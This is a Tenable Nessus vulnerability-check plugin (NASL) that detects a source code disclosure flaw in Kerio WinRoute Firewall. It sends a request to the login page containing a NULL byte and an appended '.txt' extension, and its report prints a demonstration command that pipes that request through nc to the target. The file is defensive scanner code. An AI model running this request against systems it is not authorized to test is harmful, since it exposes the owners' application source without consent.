#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59608);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_bugtraq_id(53460);
  script_osvdb_id(81829);
  script_xref(name:"EDB-ID", value:"18857");

  script_name(english:"Kerio WinRoute Firewall Web Server Remote Source Code Disclosure");
  script_summary(english:"Tries to retrieve source code");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that is affected by a
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"By sending specially crafted requests with a NULL byte followed by an
extension such as '.txt', an unauthenticated, remote attacker can
obtain the source code of PHP files available through the version of
Kerio WinRoute Firewall installed on the remote host.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 6.7.0 as the issue has been confirmed to be
resolved in that version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:kerio:winroute_firewall");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 4080, 4081);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");

port = get_http_port(default:4080);
app = "Kerio WinRoute Firewall";

server = http_server_header(port:port);
if (isnull(server)) exit(0, "The web server listening on port " + port + " does not send a Server response header.");
if (app >!< server) audit(AUDIT_NOT_LISTEN, app, port);

url = raw_string("/nonauth/login.php", 0, ".txt");
req = http_send_recv3(
  port:port,
  method: "GET",
  item:url,
  exit_on_fail:TRUE
);


# Check for code found on login.php
target_host = get_host_name();

if ("<?php" >< req[2] && 'kerio("webiface::PhpNonAuth"' >< req[2])
{
  if (report_verbosity > 0)
  {
    test_info =
      'printf "GET /nonauth/login.php\\0.txt HTTP/1.1\\r\\n\n' +
      'Host:' + target_host + '\\r\\n\\r\\n" | nc ' + target_host + ' ' + port;
    
    report =
      '\nNessus was able to verify the issue exists using the following' +
      '\nrequest : ' +
      '\n' +
      '\n' + target_host + ":" + port + "/nonauth/login.php\0.txt" +
      '\n' +
      '\nIn order to demonstrate this issue, a request such as the following' +
      '\ncan be made from the command line as a browser may not properly' +
      '\nhandle the null byte in the request : ' +
      '\n' +
      '\n' + test_info +
      '\n';

    if (report_verbosity > 1)
    {
      snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(req[2]) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_LISTEN_NOT_VULN, app, port);
